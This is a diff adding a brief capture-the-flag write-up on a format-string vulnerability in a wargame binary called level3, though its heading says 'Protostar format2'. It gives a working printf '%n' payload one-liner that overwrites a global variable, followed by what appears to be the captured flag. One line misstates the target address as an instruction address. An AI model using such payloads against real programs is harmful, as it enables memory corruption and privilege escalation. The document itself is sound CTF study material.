@@ -1,0 +1,19 @@
+Protostar format2:
+
+We want to break free... Oh, sorry, it wasn't the point.
+We want to be level 4 !
+How to do that ? Simple, disassemble the program level3:
+
+We see that main calls a function v (vuln ?)
+
+We see a format string but with "fgets" and "printf"
+We want to make the condition "0x080484df <+59>: cmp $0x40,%eax" from "0x080484da <+54>: mov 0x804988c,%eax" true
+So we want to put 64 at 0x080484df
+
+Simple:
+	python -c 'print "\x8c\x98\x04\x08" + "%.60d%4$n"' > /tmp/level3 && cat /tmp/level3 - | ./level3
+
+	Explanation: .60d -> Value decimal 60 + nb_written -> 60 + 4 -> 64 at address \x8c\x98\x04\x08
+	Tadaaa !!!
+
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
